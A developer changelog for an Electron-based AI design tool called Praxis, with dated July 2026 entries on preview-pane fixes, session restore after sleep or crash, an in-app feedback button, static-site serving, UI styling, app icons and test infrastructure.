- **Compact time.** `shortAgo()` (store) gives Cursor-style trailing labels
  ("3m", "2h", "5d", "4mo", "1y") on past-chat rows; live chats show none.
- Dropped the full active-item background (only the active chat is highlighted
  now) and the orphaned `.rail__dot` / `.rail__session*` / `.rail__spawn*` CSS.
  `test/history-ui.mjs` updated to the new `.rail__chat*` DOM.
## 2026-07-09 — Session-review modal: freeze-frame the preview; loads can't punch through
## 2026-07-09 — Modals freeze-frame the preview; loads can't punch through

Three sightings of the same seam (session-review modal ×2, feedback dialog).
(1) Opening a past chat while a project launch was still in flight: the modal
hid the native preview (drag-hide path), then the launch settled and
`preview:load`'s unconditional "recover from any leaked hide"
`setVisible(true)` painted the preview straight over the open modal — native
views always win over DOM. (2) Even without the race, reviewing a past chat
blanked the preview pane for as long as the modal was open. (3) The feedback
dialog (LKM-27) rendered partially under the preview.

- Main now tracks `previewHiddenByRenderer` (set by `preview:set-dragging`):
  `preview:load` still loads the URL but only unhides when NO renderer hide is
  active — the leaked-hide recovery survives for actual leaks. The flag clears
  in `resetStalePreview` (the overlay died with the old renderer document).
- The dropdowns' open-after-freeze logic moved to `store.ts` as
  `openWithPreviewFreeze`; the review modal AND the feedback dialog now use it:
  the preview stays visually in place as a snapshot `<img>` under the overlay
  instead of disappearing (or being covered), and the live view returns on
  close. Bonus: the feedback screenshot is captured after the freeze, so it now
  INCLUDES the preview (the native view is a separate target `capturePage`
  never saw — screenshots used to have a hole there).
- `test/history-ui.mjs` now asserts the contract from the main side (native view
  hidden under the modal, still hidden after a mid-modal `preview:load`,
  restored on close). Standalone tip: with the app open, standalone test runs
  need `DSGN_USER_DATA=$(mktemp -d)` — the running app holds the shared
  single-instance lock (the runner already isolates).

## 2026-07-09 — Survive sleep/crash: renderer recovery + full workspace/chat restore

Closing the laptop could kill the main renderer (Chromium reaps it around a
long sleep); the app either froze or — once reloaded — booted to the Welcome
screen with the OLD project's native preview still painted on top and every
chat apparently gone, even though main was still running the agent sessions
and dev server. Three layers of fix, in three commits:

1. **Main renderer recovery** (`main/index.ts`): reload on
   `render-process-gone`, repaint on `powerMonitor` resume, and hide/zero the
   preview `WebContentsView` on every main-frame `did-navigate` — PreviewPane's
   unmount cleanup never runs across a hard reload, so main must reset the
   stale view itself (page kept warm; `preview:load` re-claims it instantly).
2. **Reattach APIs** (`devserver.ts`, `agent.ts`, backends): `devserver:info`
   returns a running server's `RunningDevServer` (covers in-process static
   servers too) so a reattaching renderer recovers the URL instead of
   respawning on a new port; `agent:workspace-snapshot` returns every live
   project/chat with its in-memory record (a live session has no on-disk
   record — those are written only on close). Per-chat `isRunning` rides the
   ProviderSession contract's own terminal `done`/`error` event via
   `ctx.onEvent`, now wired in all three backends for every interactive session.
3. **Renderer restore** (`renderer/src/restore.ts`, store, App): `useWorkspace`
   `{projects, activeKey}` persists to localStorage (`dsgn:workspace`; the
   `?dsgnPanel=1` window never writes it). On boot, `restoreWorkspace` reattaches
   to whatever the snapshot says is live — rail rehydrated, each live chat
   seeded via `messagesFromTranscript` + `useChat.hydrate` (extended with an
   `isRunning` mode that opens a fresh streaming tail: the pre-reload buffered
   text only reaches the transcript on flush, so continuing deltas can't
   double-render), active project re-applied through `applyProject` with the
   preview URL from `devserver:info`. When main has nothing (real relaunch),
   the last dsgn-launched project reopens via `attempt()` and its newest
   resumable record is resumed with history seeded. Any failure falls back to
   Welcome.

Tests: `test/restore-reload.mjs` (electron tier — real reattach across a hard
`webContents.reload()`, seed/no-clobber/streaming-tail guards, dead-workspace
no-wedge). Because persisted workspace state now changes BOOT behavior, the
electron tier leaked state between tests (a prior test's project auto-reopened
in the next test's launch): `test/run.mjs` now gives each test its own
throwaway userData dir via the new `DSGN_USER_DATA` env override in
`main/index.ts` (also isolates the single-instance lock, so a killed run can't
block the next). Note: tests invoked directly (`node test/x.mjs`) still share
the real userData; the runner is the isolation boundary.

Also fixed in passing: `preview-location.mjs` was failing at HEAD~ already —
its renderer-side `window.api.agent.send = spy` silently no-ops because the
contextBridge freezes `window.api`; it now spies in MAIN by swapping the
`agent:send` handler via `app.evaluate` (and asserts on the last *user*
message, since submit opens an empty streaming-assistant placeholder).

## 2026-07-09 — Resume shows the past chat, not an empty tree — LKM-25

Resuming a "previous agent" (SessionReview's Resume) handed the SDK the
resumable session id so the model kept its context, but the renderer switched to
a brand-new, empty chat slice and never populated it from the record's
transcript — so the thread looked blank even though the agent "remembered."

The persisted `SessionRecord` already carries the full `transcript`
(`user`/`assistant`/`status` lines) and `resumeRecord` in `App.tsx` already has
the record in hand, so the fix is renderer-only (no IPC change):

- **store.ts:** new `messagesFromTranscript(transcript)` rebuilds `ChatMessage[]`
  from the flat transcript, regrouping each turn's assistant text + tool
  `status` lines into one assistant message with interleaved `segments` — the
  same shape the live stream builds via `startAssistant`/`appendDelta`/
  `appendStatus`. New `hydrate(key, messages)` action seeds a chat slice, but
  **only when it's empty** so it can never clobber a live chat.
- **App.tsx:** `resumeRecord` calls
  `hydrate(sessionKey, messagesFromTranscript(record.transcript))` before
  `setActiveChat`, so the resumed thread renders its history; new turns then
  append after it as usual.
- **Test:** `test/chat-render.mjs` gained a block that hydrates a slice from a
  sample transcript, asserts the grouping (2 user + 1 grouped assistant turn
  with text→tools→text segments and 2 statuses), renders it, and confirms
  re-hydration is a no-op on a populated slice. `messagesFromTranscript` is
  exposed as `window.__dsgnMessagesFromTranscript` for the harness.

## 2026-07-09 — In-app feedback button (files a GitHub issue) — LKM-27

A "Send feedback" affordance now files a GitHub issue on Praxis's OWN repo (the
app's git checkout, `app.getAppPath()` — same seam the self-updater uses), with
an optional screenshot and conversation transcript, each behind its own toggle.

- **Main:** `feedback.ts` registers `feedback:capture` (downscales a
  `webContents.capturePage()` of the app window to a ≤900px JPEG data URI) and
  `feedback:submit` (preflight git repo / origin / `gh`, then `gh issue create`).
  Wired in `index.ts` via `registerFeedbackIpc(() => mainWindow)`.
- **Body builder:** `src/shared/feedback-body.ts` (pure, unit-tested) assembles
  the issue title + body. GitHub gives no API to *attach* an image and caps issue
  bodies at 65536 chars, so an opted-in screenshot rides along as a base64
  data-URI inside a collapsed `<details>` (copy into a browser to view); any
  optional section that would blow the cap is dropped with a visible note while
  the feedback text always survives.
- **Renderer:** `FeedbackDialog.tsx` (shadcn Dialog) — textarea + two toggles;
  the screenshot is captured on open and previewed. Opened from a new previewbar
  icon button (always visible) and an empty-state "Send feedback" button via a
  tiny `useFeedback` store. Transcript comes from `formatConversation(messages)`.
- **Tests:** `test/feedback-body.mjs` (unit — title/body/limits) and
  `test/feedback-dialog.mjs` (electron — opens the dialog, asserts the toggles +
  send-button gating; never posts). Both registered in `test/run.mjs`.
## 2026-07-09 — Open vanilla HTML / static-site projects

Praxis previously refused any folder without a package.json (`detect()` threw
"No package.json found") and any package.json without a `dev`/`start` script.
Plain HTML/CSS/JS projects — the kind with no build tooling — were unopenable.

`detect()` now falls back to a new `framework: 'static'` when a folder has an
HTML entry (`index.html`, else the first `*.html`): either with no package.json
at all, or with a package.json whose framework is unrecognized *and* has no
dev/start script. A **recognized** framework (vite/next/…) without a dev script
still errors — its `index.html` is a build template that won't serve raw — so
the user is asked for a launch command. Both error messages now say "Enter a
command to launch this project", which the preview's existing error bar already
turns into a custom-command retry — so anything we can't auto-launch prompts for
the command (the second half of the task, already wired via `attempt(root, cmd)`).

Static sites are served by a new in-process `src/main/static-server.ts` (Node
`http.Server`, not a spawned child) so no external tool (`serve`, `python -m
http.server`) needs to be on PATH and we own the exact port. It resolves the
directory index, sets content-types, blocks path traversal, and injects a tiny
SSE live-reload snippet into served HTML + watches the tree — so agent edits
reflect in the preview the way a real dev server's HMR would (vanilla sites have
none). `devserver.ts` routes `framework:'static'` (with no command override) to
it, tracks the servers in a parallel `staticServers` map, and teaches
`stop`/`stopAll`/`isRunning` about them. New `test/static-serve.mjs` (electron
tier) covers detect→serve→assets→live-reload→traversal-block→stop.

## 2026-07-08 — Agent now knows the preview's current page

The preview's real location (link clicks, SPA route changes, initial load)
only ever lived in `PreviewUrl.tsx`'s local component state — it drove the
address bar but never reached the chat, so the agent had no idea what page it
was looking at. Added a global `usePreviewLocation` store (store.ts), wired
once in App.tsx to main's `preview:url-changed` (already emitted on every
`did-navigate`/`did-navigate-in-page`, one native preview view live at a
time). `ChatPanel`'s composer now prepends "The preview is currently showing
&lt;path&gt;." as hidden context on every send — same pattern as the selected-
element pill (`describeSelectionForPrompt`): the visible transcript still
shows only the user's own words. New test `test/preview-location.mjs`
(electron tier) covers the store plumbing and the composer's hidden prefix by
spying on `window.api.agent.send` (not frozen by contextBridge).

## 2026-07-08 — Preview body back to rounded (card border shows through)

Re-rounded the native preview view (DESKTOP_CORNER_RADIUS 0 → 15). Its corners
are genuinely transparent, so the card (a DOM rounded-rect with a 1px border)
shows through them as a clean rounded frame — the native view fills the body,
already 1px inside the card's border, at radius 15 (16px card − 1px). One real
DOM border, no masks/painting, so no doubling. App UI keeps its
-electron-corner-smoothing squircle; the native preview stays plain-round (CSS
smoothing can't reach a WebContentsView).

## 2026-07-08 — Revert corner experiments; square the preview body

Reverted the -electron-corner-smoothing + divider-removal + distinct-header
experiments (styles.css back to the standard border-bottom divider + all-rounded
corner-shape state). Then, per request, squared the preview's native view
(DESKTOP_CORNER_RADIUS 15 → 0): setBorderRadius is uniform, so a rounded body
also rounded the top under the header and revealed the card bg at the corners on
dark pages — square keeps it flush, with the header divider + card frame as the
container.

## 2026-07-08 — Electron corner smoothing (squircle); preview header divider

- Swapped the CSS `corner-shape: squircle` app-wide rule for Electron's native
  `-electron-corner-smoothing: system-ui` (iOS-style smoothing, nicer + cheaper;
  Chromium 150). Circles/pills are excluded (`-electron-corner-smoothing: 0%`)
  so the send button, spinner, status dots, and Tailwind rounded-full elements
  stay perfectly round. Verified: composer/card = system-ui, send button = 0%
  (renders a true circle).
- Preview header: dropped the previewbar's hard `border-bottom` divider. The
  header and body share the card surface (same var(--bg-subtle)); the preview
  content's rounded top edge is the visual separator now — no line, no notch.

## 2026-07-08 — Revert preview corners to all-rounded (drop the masks again)

The square-top + in-page bottom-mask approach reintroduced the doubled-corner
border it caused before, so it's reverted: the native view is rounded on all
four corners via setBorderRadius (uniform, clean border, no masks) as it was.
Electron's single-radius API means square-top/round-bottom isn't achievable
without the mask hack, and the doubling makes that not worth it. The toolbar
constant-height fix from the same commit is kept.

## 2026-07-08 — Preview: square top / rounded bottom; steady toolbar height

- The preview body's TOP corners are square (flush under the URL bar) again,
  bottom stays rounded to match the card: the native WebContentsView is square
  (setBorderRadius rounds all-or-none) and two in-page bottom-corner masks fake
  the rounding — restored from the earlier 3300c3c approach (color-only radial
  gradient, no border ring → no doubled-corner). DESKTOP_CORNER_RADIUS = 15
  (16px card − 1px border); masks track the OS theme via main's gutter color.
- Selection toolbar keeps a constant height (36px) when it morphs to the
  comment/annotate input: the submit button is 26px (was 28, matching the icon
  buttons) and the single-line input row is pinned to 18px line + 8px padding.

## 2026-07-08 — Electron 43 + squircle corners; toolbar refinements

- Electron 33 → 43.1.0 (Chromium 150, Node 24 main). patch-electron.mjs
  re-runs on install (note: the binary downloads lazily, so a first `bun add`
  may need one manual `node scripts/patch-electron.mjs`). Full UI suite green on
  43 after fixing one stale expectation (chat-render expected a gemini backend
  in the UI list; gemini is now a flag-gated main-only backend).
- corner-shape: squircle app-wide: a blanket `*,*::before,*::after` rule in
  styles.css (inert without a border-radius, so it only reshapes already-rounded
  elements) plus a `:host *` rule in the preview overlay's injected shadow style.
  Verified squircle renders (Chromium 150; CSS.supports true).
- Toolbar: props/delete hidden while the inline comment/annotate input is open;
  the divider now isolates Delete from the rest.

## 2026-07-08 — Toolbar morphs into the comment field (Figma Make-style)

- The selection toolbar is now a DARK pill (Figma-like) whose content MORPHS in
  place: comment/annotate are leading toggles; activating one expands an inline
  input + round submit inside the same pill (animated width), with
  props/code/delete persisting as trailing icons. Escape/toggle collapses back;
  a whole-page C/Y-mode click shows the same pill in input state at the clicked
  element. The old floating white composer bubble is deleted. IPC and test
  hooks unchanged (COMMENT payload, data-dsgn-composer on the pill,
  aria-label=Submit). Built by an Opus subagent from a frame-by-frame spec of
  the reference recording; verified independently (typecheck/build,
  select-element, comment-mode, smoke, code-drawer, before/after captures in
  test/artifacts/toolbar-state-{a,b}.png).

## 2026-07-07 — Public-repo doc cleanup

Prepping the repo to go public: removed personal-machine details from the
front-facing docs. README naming note no longer mentions the local clone dir
(just that `dsgn` is the original name living on in the code); clone URL now
points at the public `praxis` repo over https; "teammate" → "you"; fixed a
dangling "see the review doc" reference. CLAUDE.md header dropped "(repo:
dsgn)" and the repo/remote naming caveat. TASKS.md dropped the branch-cleanup
item (local git housekeeping referencing `~/.agent-runner/`) and reframed the
naming item as an optional rename. A `~/.git` setup aside in the log was
genericized. Grep-verified no `/Users/…`, agent-runner, or personal-infra
references remain in tracked docs (the leftover `~/.bun`/`~/.local` hits are
generic tool paths in code).

## 2026-07-07 — Cut CONTEXT.md; add a docs-drift guard

- Deleted `docs/CONTEXT.md`. Its three sections each duplicated something else
  (what-it-is → README/CLAUDE; rationale → PROGRESS; module map → CLAUDE's
  architecture block). Folded the genuinely-unique parts — the **Gotchas** and
  the non-obvious **why-it's-built-this-way** rationale — into CLAUDE.md, and
  retargeted the session-start ritual (was "read CONTEXT.md first") to
  PROGRESS + TASKS. docs/ is now DESIGN + PROGRESS + TASKS.
- **Anti-drift guard:** `test/docs-links.mjs` (new, unit tier → runs in CI)
  parses every anchored repo path referenced in CLAUDE.md + README.md and fails
  if any no longer exists. This is the check that would have caught the stale
  `PropEditor.tsx`/`TokenPalette.tsx` references. A reminder-hook was considered
  and rejected — a deterministic CI check has zero noise vs. a nag agents tune
  out. Verified: catches a bad path, 16/16 unit green.

## 2026-07-07 — Health/infra tasks: test runner, CI, Biome, gemini gate

Implemented the four safe/verifiable items from the review (the rest — harness
migration, god-file splits, naming decision — stay deferred in TASKS.md with
their reasons; branch cleanup needs a human call, see TASKS.md).

- **`test/run.mjs`** replaces the ~50-command `test`/`verify` `&&` chains:
  `node test/run.mjs unit|electron|live|all`, keep-going, exit-0=pass (incl.
  e2e self-SKIP), one build before the electron tier, summary table, non-zero
  on any failure. `test`=`unit electron`, `verify`=`all`; `test:*` aliases kept.
  Verified: `node test/run.mjs unit` → 15/15 green.
- **CI** — `.github/workflows/ci.yml` (typecheck + unit tier on push/PR; bun
  1.3.x). Electron/live tiers deferred to a macOS runner (noted inline).
- **Biome 2.5.2** dev dep + `biome.json` matched to the existing style; `lint`/
  `format` scripts. Repo-wide reformat intentionally deferred to its own commit.
- **Gemini gated** — `pickProvider` falls back to Claude unless
  `DSGN_EXPERIMENTAL_GEMINI=1`; banner in `gemini.ts`; removed from the renderer
  picker (was silently falling back to Claude when selected). Claude/Codex
  paths byte-identical. typecheck green; `provider-seam` now sets the flag.
- Docs: CLAUDE.md commands/test-convention updated to the runner + `lint`;
  fixed README + CLAUDE.md pointers to the (now-deleted) review doc.

## 2026-07-07 — Docs folder pruned to the live set

- Removed `TASKS-archive.md` (history git already holds), `PLAN-proactive-checks.md`
  (shipped as diag-rules.ts; reworded the one code comment that cited it), and
  `REVIEW-2026-07-07.md` (folded its live items into `TASKS.md`). docs/ is now
  CONTEXT + DESIGN + PROGRESS + TASKS.
- `TASKS.md` now carries the health/infra backlog with deferred items annotated
  (why each isn't safely auto-completable headless).

## 2026-07-07 — Repo health review + CLAUDE.md refresh

- Full review written to `docs/REVIEW-2026-07-07.md`: 9 ranked improvement
  items (finish the Praxis/dsgn naming decision, replace the package.json
  test mega-chains with a `test/run.mjs` runner, shared test harness, CI,
  lint/format tool, god-file splits, doc staleness fixes, gemini backend has
  no SDK dep, branch cleanup) plus a keep-doing-it list.
- CLAUDE.md rewritten: it still claimed "Plain CSS, no Tailwind" (inverted
  since 2026-06-26), listed 3 of ~27 main modules, and omitted the
  `src/preview/preload.ts` process boundary and the three test tiers. Now
  matches reality; typecheck + all 15 pure-bun tests were green at review time.
- Docs cleanup: removed two fully-shipped, code-unreferenced docs —
  `PLAN-direct-editing.md` (R1/F1/F3 all landed: rules.ts, worktrees.ts,
  edit-history.ts, spawn-comment/comment-mode tests) and
  `v7-multi-provider-design.md` (backends/ + provider-seam shipped). Kept
  `PLAN-proactive-checks.md` (diag-rules.ts still cites it) and
  `TASKS-archive.md` (active TASKS.md links it). Fixed CONTEXT.md staleness:
  header date, `PropEditor.tsx`→`PropPanel.tsx`, `TokenPalette.tsx`→
  `TokenOfferCard.tsx`.
- README rewritten: was "dsgn / working v1 + v2 first slice / Claude-powered";
  now Praxis, v9 state, multi-provider, four process boundaries, iOS sim,
  Tailwind+shadcn, three test tiers.

## 2026-07-04 — Preview self-heals when its dev server dies and comes back

- A dev server that dies mid-session (crash, external kill) left the preview
  permanently on Chromium's error page (black in dark mode): the HMR client
  reloads when its websocket drops, the load fails with CONNECTION_REFUSED, and
  the old retry budget (40 × 400ms ≈ 16s) ran out long before any restart —
  nothing ever re-navigated the view. Discovered the hard way: a session's
  lkmv.ch server was killed out from under a live preview (mistaken for a test
  leak), and the pane stayed black even after the server came back.
- Fix: `did-fail-load` no longer gives up after the budget — past 40 fast
  retries it settles into a slow 3s poll for as long as a previewUrl is set.
  Idle/placeholder views never poll (the handler only fires for the current
  previewUrl). Budget still resets on successful load.
- Verified with a live scenario: open fixture → kill its server + reload →
  error page for 25s (budget exhausted) → start replacement server on the same
  port → preview recovers within ~3s, no project reopen. Smoke, open-preview,
  ready-gating green.

## 2026-07-06 — Prop panel always-on (floating ⇄ docked); strip cleanup

- The PropPanel opens for EVERY selection now, not just schema-backed ones: a
  resolved schema shows the editable fields as before; otherwise the panel
  hosts the readiness message that used to sit in the composer strip (setup
  link for unstamped elements — .proppanel__link; owner jump —
  .proppanel__owner; prompt-only hint). Default layout is a FLOATING card at
  the preview's top right (auto height, max 65vh); a header toggle docks it as
  the full-height right sidebar. Mode persists (usePropPanelMode →
  localStorage). Both modes reserve the same native-preview inset strip — the
  native view always paints above DOM, floating "over" it is impossible.
- Composer strip: now a single aligned row (pill + source), the "No editable
  props…" hint removed (it lives in the panel).
- Composer placeholder: "Ask Praxis  (/ for skills)".
- Mobile viewport: scrollbars hidden inside the bezel (injected style with the
  frame) — phones don't show persistent scrollbars.
- Tests: ready-gating asserts the panel's readiness classes (the old "panel
  must NOT open for no-schema" flipped by design); select-element owner jump →
  .proppanel__owner.

## 2026-07-06 — In-preview selection toolbar; editable URL bar; device toggle

- The element actions moved from the composer strip into a floating toolbar
  ADJACENT to the selection inside the preview (preload-drawn, in the overlay's
  shadow tree): comment/annotate open the in-page composer directly on the
  element (composeKind now decouples an open composer from the armed mode);
  code/delete relay to the renderer over `dsgn:preview:toolbar-action`. The
  toolbar tracks scroll/resize, hides on HMR-detach, mode arming, select-off,
  and on the new `preview:clear-selected` (renderer drops selection → pill ×,
  send, delete). The composer strip keeps pill + source + readiness hint only.
- Preview bar: the URL is now shown in full and the part after the origin is
  editable in place (Enter navigates via preview.load — still guarded to
  localhost; Escape reverts). New `preview:url-changed` relay (did-navigate +
  did-navigate-in-page) keeps it tracking SPA routes/link clicks. Desktop/Mobile
  segmented control replaced with a single Figma-style MonitorSmartphone icon
  toggle (⌘1/⌘2 + Actions menu unchanged).
- Composer bottom row: select button sized to match the backend/model selects
  (`.iconbtn--sm`).
- Tests: select-element asserts the toolbar (all four actions) inside the
  preview page and that it hides when the pill clears; annotations drives the
  engine directly (UI path covered by comment-mode); code-drawer/code-peek open
  the drawer via its store; viewport-per-project is PORT-AGNOSTIC now (a live
  app session on 7777 must not fail the suite — reads the URL from the bar).

## 2026-07-07 — macOS materials; drawer navigation; assorted UX

- macOS vibrancy: the window is an NSVisualEffectView 'sidebar' material
  surface (vibrancy + transparent bg, darwin only). The rail is fully
  transparent (most vibrant); content surfaces (.pane--chat/.pane--preview/
  .empty, console) tint at 82% of var(--bg) via color-mix so the material
  reads subtly everywhere; elevated cards stay opaque. GOTCHA: the rail sits
  INSIDE .panes — painting .panes covers the material under the rail. On
  darwin the nativeTheme repaint must skip the window's background.
- Code drawer: Cmd+click a capitalized tag resolves through the file's imports
  ($lib/@/~ aliases + one barrel hop; works for .svelte/.vue via a text scan —
  the AST resolver is TSX-only) and opens that component; Cmd-hover underlines
  once a name is KNOWN to resolve (cached per file). Browser-style back/forward
  over a history stack in useCodeDrawer.
- Selection flow: S relays from the focused preview (preload → renderer, same
  toggle); a new pick resets island/drawer/in-page composer to just the
  toolbar; the toolbar gained an 'Edit props' action — the island opens
  explicitly now, never auto (usePropsIsland; owner-jump keeps it open).
- Launch status: window-top banner removed — a bottom-center pill INSIDE the
  preview (preload-drawn, re-armed across placeholder loads) when panes exist,
  or beside the corner cat on first open (no preview surface exists yet).
- Fixed: cat loader shrunk by a blanket 26px→20px replace meant for the
  sidebar toggle (which is now 20×20 with a 14px icon).

## 2026-07-06 — Island-only props (docked sidebar removed); hover un-sticks

- The docked-sidebar mode is GONE by decision: the props island is the only
  form. The header button now COLLAPSES it to a small chip (component name +
  sliders icon) instead of docking; collapse state lives in the island itself
  (it outlives selections) and persists via localStorage. The island reports
  width+height now (panel:size) and PanelHost hugs the view to the content —
  a transparent native view eats clicks, so a collapsed chip must shrink the
  whole view. usePropPanelMode / PanelAction 'dock' / the inset reservation
  are deleted; PropPanel is single-variant again.
- Tests that asserted panel DOM in the main renderer now query the ISLAND's
  webContents (panelEval/waitPanel helpers + expandPanel guard against a
  persisted collapsed state).
- Select mode: moving the cursor OUT of the preview clears the hover highlight
  (mouseout with relatedTarget null) — it used to stick on the last hovered
  element; selection outlines are unaffected.

## 2026-07-06 — Floating props island above the preview; persistent selection

- The floating prop panel now paints ON TOP of the live preview content. DOM
  can't do that (the native view always wins), so the island is a second
  WebContentsView stacked above the preview, booting the same renderer bundle
  with ?dsgnPanel=1 (renders just PropPanel on a transparent background). The
  main renderer (PanelHost) drives bounds/state over panel:* IPC, handles its
  actions, resizes to reported content height, and hides it under freeze
  overlays. Docked mode is unchanged: in-DOM sidebar + reserved preview inset.
  PropPanel gained variant='overlay'|'docked' + onToggleDock; the mode persists
  (usePropPanelMode). Tests asserting panel DOM dock it first
  (__dsgnPropPanelMode).
- Selection stays highlighted while hovering other elements: the preload keeps
  a dedicated selection layer — outlines on every element sharing the picked
  element's data-dsgn-source (loop/component instances) with an "h3 × 4" badge,
  independent of the hover box. Cleared with the toolbar (pill ×, send, mode
  arm, select-off); tracks scroll/resize/HMR relayout on the pin cadence.

## 2026-07-06 — Selection UX: composer pill + element actions (Figma Make-style)

- Preview bar's three mode buttons (select/comment/annotate) are gone. Element
  select now lives in the composer's bottom row (like Figma Make's Edit) — the
  button drives App's toggle through a new `useUiActions` registry store, so the
  simulator-vs-web routing stays in one place. S/C/Y shortcuts + the native menu
  item unchanged.
- Selecting an element puts a removable PILL in the composer (tag + ident + ×)
  with element-scoped actions beside it: Comment (detached parallel agent, same
  spawn flow as preview C-mode), Annotate (pin a note, no agent), Show code
  (editor drawer), Delete (agent turn). Comment/annotate share one inline
  textarea in the strip.
- The "Ask dsgn…" button and its visible "In the preview I selected the <p…>
  element (selector: …)" seeding are REMOVED: the element reference now rides
  along invisibly — ChatPanel's send() prepends `describeSelectionForPrompt` to
  the prompt for the model while the transcript shows only the user's words.
  The pill is consumed on send. Delete shows a short "Delete the <tag> element"
  user message with the same hidden context.
- Inspector.tsx rewritten as the strip (kept class names tests rely on:
  inspector__tag/__source/__ready/__link/__owner/__noteinput/__notesave/
  __codebtn). Tests updated: select-element (pill + clean composer instead of
  seeded text), annotations (Annotate icon instead of "Note" text button),
  comment-mode (arms via store — the same path as the C/Y shortcuts).

## 2026-07-04 — Preview corners: native setBorderRadius, corner-mask hack removed

- The desktop preview's bottom corners looked DOUBLED: the in-page corner masks
  (injected divs painting arcs over the previewed app) keyed their colors off
  `nativeTheme` (the OS appearance), but the app UI renders light regardless —
  on a dark-mode OS the masks painted `#111113`/`#2a2a2e` next to the card's
  light corner, drawing a second corner. Any color/geometry disagreement in
  that scheme doubles the corner by construction.
- Fix: deleted the whole mask path (main's `cornerRadius`/`cornerOpts`/
  `preview:set-corners` IPC + theme repaint, preload's `setCorners` injector,
  `api.setCorners`) and instead pass `radius: DESKTOP_CORNER_RADIUS` through
  `preview:set-bounds` → the existing native `view.setBorderRadius()` (the same
  path mobile's iPhone-screen rounding already used). All four corners round;
  the top ones show as a subtle inset under the card header — content-in-a-
  rounded-panel look, consistent with the bottom. Captures are square content
  now (no baked-in masks), and the freeze `<img>` radius matches.
- PR #63 was reverted wholesale first (its corner decisions were suspect), then
  its two still-valid fixes were re-applied on top of the new scheme: buildPins
  skips materializing the overlay host when there are no pins, and
  `preview:reset` zeroes frame/pins state (cornerRadius no longer exists).
- Verified: repro harness captured the composited window (screencapture of the
  window rect — the native view never shows in renderer screenshots) before/
  after; before shows the dark mask arc + square corner, after a single clean
  rounding. typecheck + smoke, open-preview, mobile-frame, viewport-per-project,
  select-element, annotations, comment-mode, ready-gating all green.
- Gotcha hit while testing: a leaked `vite dev --port 7777` from a previous app
  session made viewport-per-project time out (fixture landed on 7778). Check
  `lsof -iTCP:7777` before blaming a test.

## 2026-07-03 — LKM-20: Code opens the editor drawer; unified code colors

- **"Code" now opens the editor drawer directly** (right, under the preview) instead
  of an inline read-only peek in the left inspector. The Inspector's Code button
  toggles `useCodeDrawer` on the selected element's source; `CodePeek.tsx` is deleted
  (its `source:read` / `source:open-in-editor` engine in `props.ts` is unchanged and now
  drives the drawer).
- **Drawer gains the peek's affordances:** an **Editor** button (`source:open-in-editor`
  → the user's own editor) and an **Expand** toggle that grows the drawer while keeping a
  ~160px live-preview strip (measures its `.previewcard__body` container via
  ResizeObserver; grows the `usePanelInset.bottom` it reserves).
- **Unified colors:** the CodeMirror drawer is themed from the app's `--background`/
  `--foreground`/`--muted` tokens (so it matches the surrounding surfaces and flips with
  light/dark) with a `HighlightStyle` matched 1:1 to the styles.css highlight.js palette
  the markdown code blocks use. Previously the drawer used CodeMirror's default theme,
  which didn't match the (light) peek — the reported mismatch.
- Tests: `test/code-peek.mjs` UI section now asserts the Code button opens the drawer
  (no `.codepeek`) with Editor + Expand controls; `test/code-drawer.mjs` opens via the
  Code button (dropped the peek→Edit two-step). Both green; typecheck green.

## 2026-07-03 — Dock icon size fix: ship the layered (Assets.car) icon

- The dock icon rendered ~10% larger than neighboring apps. Cause: the iOS
  Icon Composer export is full-bleed (opaque edge-to-edge, no margins), and a
  legacy flat .icns is drawn at its canvas scale, while macOS 26 gives native
  layered icons the standard sizing treatment.
- Fix, two parts:
  - Compiled `dsgn.icon` (Icon Composer source in ~/Downloads/app-icon) with
    `xcrun actool --app-icon dsgn --platform macosx` → `build/Assets.car` +
    small-size renditions. `scripts/patch-electron.mjs` now also installs
    Assets.car into the dev Electron.app and sets `CFBundleIconName=dsgn`, so
    Tahoe renders the true layered icon (with dark/tinted variants).
  - Rebuilt `build/icon.png`/`icon.icns` on the macOS grid: plate scaled to
    204/256 of the canvas + transparent margins + soft shadow (geometry measured
    from actool's own 256px render; 512/1024 synthesized from the 1024 iOS
    export with sharp, small sizes taken from actool's output).
- Removed `app.dock.setIcon()` — runtime dock images skip the system icon
  treatment; the bundle's icon (patched in by postinstall) is the right path.
- Verified via `NSRunningApplication.icon` (what the Dock shows for a running
  app): our plate is 206×206@(25,25) in 256 — pixel-identical geometry to
  Music.app. Typecheck + smoke green.

## 2026-07-03 — Real app icon + dev Electron.app rebrand

- **Real icon artwork**: replaced the placeholder `build/icon.png` with the
  pixel-cat icon from the design's Icon Composer exports
  (`Icon-iOS-Default-1024x1024@1x.png`); generated `build/icon.icns` from it
  (sips + iconutil, all sizes). Deleted `scripts/make-placeholder-icon.mjs`.
- **Dev menu bar said "Electron"**: on macOS the app-menu title, Cmd-Tab entry,
  and Activity Monitor name come from Electron.app's own Info.plist —
  `app.setName()` cannot change them in dev. Since dsgn ships as source and runs
  via `bun run dev`, added `scripts/patch-electron.mjs` (postinstall): sets
  CFBundleName/CFBundleDisplayName to Praxis in
  `node_modules/electron/dist/Electron.app`, swaps `electron.icns` for ours, and
  ad-hoc re-signs the bundle (editing a signed bundle breaks its seal; unsigned
  apps get killed on arm64). Idempotent; darwin-only; re-runs on every install
  since `bun install` restores stock Electron. Bundle id stays
  `com.github.Electron` on purpose — changing it would reset TCC permission
  grants (screen recording etc.) for the dev app.
- Verified: typecheck + smoke green after the re-sign; live launch shows
  LSDisplayName "Praxis" and a menu-bar screenshot confirms the app menu reads
  Praxis.

## 2026-07-03 — Branding + File menu (Praxis)

- Renamed the app Electron → **Praxis**: `app.setName('Praxis')` at main module
  load (drives the macOS app-menu label + About panel), window `title`, renderer
  `<title>`, and `productName` in package.json (for eventual packaging).
- **App icon**: `build/icon.png` loaded via `nativeImage`; set as the dev dock
  icon (`app.dock.setIcon`, macOS) and the `BrowserWindow` `icon` (Win/Linux),
  both guarded on `!isEmpty()` so a missing file degrades gracefully. NOTE: the
  committed PNG is a generated placeholder (`scripts/make-placeholder-icon.mjs`) —
  the real artwork from the design's app-icon.zip couldn't be fetched in the
  sandboxed runner (no network); drop it in at `build/icon.png` to replace it.
- **File menu**: new top-level File menu with New Project (Cmd+N) / Open Project
  (Cmd+O) — moved out of the Actions menu — plus **Open Recent**, a submenu of up
  to 8 recents + Clear Menu. Recents live in the renderer store (localStorage); it
  pushes them to main over `menu:set-recents`, main rebuilds the native submenu,
  and a chosen recent comes back over `menu:open-recent` (reopens keeping the
  current project warm). `test/menu-recents.mjs` asserts the rename + menu.
  (Playwright's Electron launch can't complete its handshake in this worktree
  runner — the pre-existing smoke test times out identically — but the built main
  boots and runs without crashing; typecheck + build are green.)

